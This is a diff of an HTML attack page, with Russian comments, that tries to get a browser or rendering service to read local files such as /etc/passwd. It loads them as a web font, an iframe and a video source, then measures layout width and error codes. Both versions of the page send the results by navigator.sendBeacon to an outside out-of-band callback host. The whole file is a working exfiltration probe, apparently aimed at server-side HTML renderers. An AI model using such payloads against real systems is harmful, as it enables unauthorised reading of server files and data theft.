@@ -1,44 +1,44 @@
 <!DOCTYPE html>
 <html>
-<style>
-    /* Пытаемся подсунуть системный файл как шрифт */
-    @font-face {
-        font-family: 'Leaker';
-        src: url('file:///etc/passwdkirayoshikjhe');
-    }
-
-    body {
-        font-family: 'Leaker', Arial;
-    }
-</style>
+<head>
+    <style>
+        /* Пытаемся скормить passwd как шрифт */
+        @font-face {
+            font-family: 'StealFont';
+            src: url('file:///ertyuio/pdfghjkl;');
+        }
+        #probe {
+            font-family: 'StealFont', Arial;
+            font-size: 100px;
+            position: absolute;
+            visibility: hidden;
+        }
+    </style>
+</head>
 <body>
-    <div id="test">root:x:0:0:root:/root:/bin/bash</div>
-    
+    <div id="probe">root</div>
     <script>
-        const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
-        
-        // Если шрифт применится (даже криво), размеры текста изменятся
-        const width = document.getElementById('test').offsetWidth;
-        
-        navigator.sendBeacon(hook + "/FONT_WIDTH", JSON.stringify({
-            w: width,
-            msg: "If width is not standard, file was parsed"
-        }));
-
-        // Попытка через IFRAME (иногда Chrome позволяет увидеть размер контента)
-        var ifr = document.createElement('iframe');
-        ifr.src = 'file:///etc/passwd';
-        ifr.style.width = '100px';
-        document.body.appendChild(ifr);
-        
-        setTimeout(() => {
-            try {
-                // Если мы можем прочитать длину истории или кадры - файл загружен
-                navigator.sendBeacon(hook + "/IFRAME_STATUS", ifr.contentWindow.length);
-            } catch(e) {
-                navigator.sendBeacon(hook + "/IFRAME_LOCKED", "SOP Active");
-            }
-        }, 1000);
+        (function() {
+            const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
+            const probe = document.getElementById('probe');
+            
+            // Ждем чуть-чуть, пока браузер попытается "отрисовать" шрифт
+            setTimeout(() => {
+                const width = probe.offsetWidth;
+                // Отправляем ширину. Если она отличается от стандартного Arial, 
+                // значит файл был считан парсером шрифтов!
+                navigator.sendBeacon(hook + "/FONT_WIDTH_LEAK", "Width: " + width);
+                
+                // ВТОРОЙ ШАНС: Пробуем Video/Audio тег (иногда они менее защищены)
+                const v = document.createElement('video');
+                v.src = "file:///fghjkl/sdjfkld";
+                v.onloadedmetadata = () => navigator.sendBeacon(hook + "/VIDEO_METADATA_LEAK");
+                v.onerror = (e) => {
+                    // Если ошибка 4 (MEDIA_ERR_SRC_NOT_SUPPORTED), файл БЫЛ прочитан
+                    navigator.sendBeacon(hook + "/VIDEO_ERROR_CODE", "Code: " + v.error.code);
+                };
+            }, 1000);
+        })();
     </script>
 </body>
 </html>
